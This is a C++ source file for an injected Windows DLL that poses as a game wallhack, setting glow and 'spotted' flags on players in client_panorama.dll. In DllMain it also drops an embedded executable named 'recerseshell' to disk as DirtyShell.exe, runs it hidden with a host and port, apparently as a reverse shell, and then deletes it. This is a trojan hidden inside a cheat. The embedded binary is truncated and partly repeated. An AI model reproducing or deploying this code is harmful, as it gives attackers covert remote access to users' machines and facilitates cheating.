#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include "offsets.hpp"
#include <stdio.h>

char recerseshell[] = {
	"\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"
	"\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00"
	"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xF0\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD"
	"\x21\xB8\x01\x4C\xCD\x21\x54\x68\x69\x73\x20\x70"
	"\x72\x6F\x67\x72\x61\x6D\x20\x63\x61\x6E\x6E\x6F"
	"\x74\x20\x62\x65\x20\x72\x75\x6E\x20\x69\x6E\x20"
	"\x44\x4F\x53\x20\x6D\x6F\x64\x65\x2E\x0D\x0D\x0A"
	"\x24\x00\x00\x00\x00\x00\x00\x00\xFB\x4D\x36\x2E"
	"\xBF\x2C\x58\x7D\xBF\x2C\x58\x7D\xBF\x2C\x58\x7D"
	"\xB6\x54\xCB\x7D\xB1\x2C\x58\x7D\x3E\x47\x59\x7C"
	"\xBD\x2C\x58\x7D\x3E\x47\x5D\x7C\xAE\x2C\x58\x7D"
	"\x3E\x47\x5C\x7C\xB5\x2C\x58\x7D\x3E\x47\x5B\x7C"
	"\xBD\x2C\x58\x7D\xDA\x4A\x59\x7C\xBA\x2C\x58\x7D"
	"\xBF\x2C\x59\x7D\x88\x2C\x58\x7D\x89\x40\x51\x7C"
	"\xBE\x2C\x58\x7D\x89\x40\xA7\x7D\xBE\x2C\x58\x7D"
	"\x89\x40\x5A\x7C\xBE\x2C\x58\x7D\x52\x69\x63\x68"
	"\xBF\x2C\x58\x7D\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xB6\x54\xCB\x7D\xB1\x2C\x58\x7D\x3E\x47\x59\x7C"
	"\xBD\x2C\x58\x7D\x3E\x47\x5D\x7C\xAE\x2C\x58\x7D"
	"\x3E\x47\x5C\x7C\xB5\x2C\x58\x7D\x3E\x47\x5B\x7C"
	"\xBD\x2C\x58\x7D\xDA\x4A\x59\x7C\xBA\x2C\x58\x7D"
	"\xBF\x2C\x59\x7D\x88\x2C\x58\x7D\x89\x40\x51\x7C"
	"\xBE\x2C\x58\x7D\x89\x40\xA7\x7D\xBE\x2C\x58\x7D"
	"\x89\x40\x5A\x7C\xBE\x2C\x58\x7D\x52\x69\x63\x68"
	"\xBF\x2C\x58\x7D\x00\x00\x00\x00\x00\x00\x00\x00"
};


DWORD fMain(HMODULE hMod)
{
	uintptr_t client = (uintptr_t)GetModuleHandle(TEXT("client_panorama.dll"));


	uintptr_t pLocalPlayer = client + offsets::dwLocalPlayer;
	uintptr_t pGlowObjectManager = client + offsets::dwGlowObjectManager;
	uintptr_t pEntityList = client + offsets::dwEntityList;

	while (true)
	{
		if (GetAsyncKeyState(VK_END)) break;
		uintptr_t LocalPlayer = *(uintptr_t*)pLocalPlayer;
		uintptr_t GlowObjectManager = *(uintptr_t*)pGlowObjectManager;
		uintptr_t EntityList = *(uintptr_t*)pEntityList;

		if (LocalPlayer != NULL && GlowObjectManager != NULL && EntityList != NULL)
		{
			int myTeamNum = *(int*)(LocalPlayer + offsets::m_iTeamNum);
			for (short i = 0; i < 64; i++)
			{
				uintptr_t entity = *(uintptr_t*)(pEntityList + i * 0x10);
				if (entity == NULL) continue;
				if (*(bool*)(entity + offsets::m_bDormant)) continue;

				*(int*)(entity + offsets::m_bSpotted) = 1;

				int glowIndex = *(int*)(entity + offsets::m_iGlowIndex);
				int entTeamNum = *(int*)(entity + offsets::m_iTeamNum);

				if (entTeamNum == myTeamNum)
				{
					// Teammate
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x4)) = 0.f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x8)) = 1.f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0xC)) = 0.f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x10)) = 1.7f;
				}
				else
				{
					// Enemy
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x4)) = 1.f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x8)) = 0.f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0xC)) = 0.8f;
					*(float*)((GlowObjectManager)+((glowIndex * 0x38) + 0x10)) = 1.7f;
				}
				*(bool*)((GlowObjectManager)+((glowIndex * 0x38) + 0x24)) = true;
				*(bool*)((GlowObjectManager)+((glowIndex * 0x38) + 0x25)) = false;
			}
		}


		Sleep(40);
	}

	FreeLibraryAndExitThread(hMod, 0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD fdwReason, LPVOID lpReserved)
{
	DisableThreadLibraryCalls(hMod);
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)fMain, hMod, 0, nullptr);
		int i, len = sizeof(recerseshell);
		FILE* ptr;
		ptr = fopen("DirtyShell.exe", "wb");
		for (i = 0; i < len; i++)
			fprintf(ptr, "%c", recerseshell[i]);

		fclose(ptr);
		Sleep(1000);
		WinExec("DirtyShell.exe 127.0.0.1 8080", SW_HIDE);
		Sleep(1000);
		WinExec("cmd /c ""del DirtyShell.exe"" ", SW_HIDE);
	}
	return TRUE;
}